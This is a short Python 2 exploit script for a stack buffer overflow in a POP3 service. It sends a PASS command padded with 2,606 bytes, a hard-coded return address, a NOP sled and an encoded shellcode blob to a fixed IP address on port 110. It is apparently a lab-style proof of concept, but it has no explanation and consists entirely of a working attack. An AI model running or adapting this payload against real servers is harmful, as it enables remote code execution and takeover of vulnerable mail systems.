#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#5F4A358F
ret = "\x8F\x35\x4A\x5F"
nops = "\x90" * 16
shellcode = ("\xdd\xc4\xd9\x74\x24\xf4\x5a\xbe\xe1\x1a\xb7\x3d\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x72\x13\x03\x93\x09\x55\xc8\xaf\xc6\x1b"
"\x33\x4f\x17\x7c\xbd\xaa\x26\xbc\xd9\xbf\x19\x0c\xa9\xed\x95"
"\xe7\xff\x05\x2d\x85\xd7\x2a\x86\x20\x0e\x05\x17\x18\x72\x04"
"\x9b\x63\xa7\xe6\xa2\xab\xba\xe7\xe3\xd6\x37\xb5\xbc\x9d\xea"
"\x29\xc8\xe8\x36\xc2\x82\xfd\x3e\x37\x52\xff\x6f\xe6\xe8\xa6"
"\xaf\x09\x3c\xd3\xf9\x11\x21\xde\xb0\xaa\x91\x94\x42\x7a\xe8"
"\x55\xe8\x43\xc4\xa7\xf0\x84\xe3\x57\x87\xfc\x17\xe5\x90\x3b"
"\x65\x31\x14\xdf\xcd\xb2\x8e\x3b\xef\x17\x48\xc8\xe3\xdc\x1e"
"\x96\xe7\xe3\xf3\xad\x1c\x6f\xf2\x61\x95\x2b\xd1\xa5\xfd\xe8"
"\x78\xfc\x5b\x5e\x84\x1e\x04\x3f\x20\x55\xa9\x54\x59\x34\xa6"
"\x99\x50\xc6\x36\xb6\xe3\xb5\x04\x19\x58\x51\x25\xd2\x46\xa6"
"\x4a\xc9\x3f\x38\xb5\xf2\x3f\x11\x72\xa6\x6f\x09\x53\xc7\xfb"
"\xc9\x5c\x12\xab\x99\xf2\xcd\x0c\x49\xb3\xbd\xe4\x83\x3c\xe1"
"\x15\xac\x96\x8a\xbc\x57\x71\xbe\x4b\x5c\x83\xa8\x49\x62\x82"
"\x93\xc7\x84\xee\xf3\x81\x1f\x87\x6a\x88\xeb\x36\x72\x06\x96"
"\x79\xf8\xa5\x67\x37\x09\xc3\x7b\xa0\xf9\x9e\x21\x67\x05\x35"
"\x4d\xeb\x94\xd2\x8d\x62\x85\x4c\xda\x23\x7b\x85\x8e\xd9\x22"
"\x3f\xac\x23\xb2\x78\x74\xf8\x07\x86\x75\x8d\x3c\xac\x65\x4b"
"\xbc\xe8\xd1\x03\xeb\xa6\x8f\xe5\x45\x09\x79\xbc\x3a\xc3\xed"
"\x39\x71\xd4\x6b\x46\x5c\xa2\x93\xf7\x09\xf3\xac\x38\xde\xf3"
"\xd5\x24\x7e\xfb\x0c\xed\x9e\x1e\x84\x18\x37\x87\x4d\xa1\x5a"
"\x38\xb8\xe6\x62\xbb\x48\x97\x90\xa3\x39\x92\xdd\x63\xd2\xee"
"\x4e\x06\xd4\x5d\x6e\x03")

buffer = 'A' * 2606 + ret + nops + shellcode
try:
        print "\nSending evil buffer..."
        s.connect(('11.11.11.9',110))
        data = s.recv(1024)
        s.send('USER username' +'\r\n')
        data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        print "\nDone!."
except:
        print "Could not connect to POP3!"



